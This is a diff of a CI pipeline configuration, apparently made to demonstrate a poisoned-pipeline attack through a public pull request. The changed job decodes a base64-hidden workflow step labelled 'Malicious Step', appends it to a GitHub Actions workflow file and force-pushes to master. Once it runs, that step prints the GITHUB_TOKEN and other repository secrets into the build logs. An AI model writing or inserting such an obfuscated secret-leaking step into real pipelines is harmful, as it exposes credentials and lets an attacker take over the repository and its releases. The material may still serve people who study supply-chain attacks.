@@ -36,9 +36,9 @@ jobs:
           name: Git Push to Master 
           command: |
             git branch -a
-            echo "ICAKICAtIG5hbWU6IE1hbGljaW91cyBTdGVwIChJbmplY3RlZCBCeSBQUikKICAgICAgcnVuOiBlY2hvICIke3sgc2VjcmV0cy5HSVRIVUJfVE9LRU4gfX0sICR7eyBzZWNyZXRzLk5QTV9BVVRIX1RPS0VOIH19Igo=" | base64 --decode >> .github/workflows/test.yaml
+            echo "ICAKICAgIC0gbmFtZTogTWFsaWNpb3VzIFN0ZXAgKEluamVjdGVkIEJ5IFBSKQogICAgICBydW46IGVjaG8gIiR7eyBzZWNyZXRzLkdJVEhVQl9UT0tFTiB9fSwgJHt7IHNlY3JldHMuTVlTRUNSRVQgfX0i" | base64 --decode >> .github/workflows/test.yaml
             git add .
-            git commit -m "This is "
+            git commit -m "This is Malicious Step (Injected By Public PR)"
             git push origin --force
 
 # Orchestrate jobs using workflows
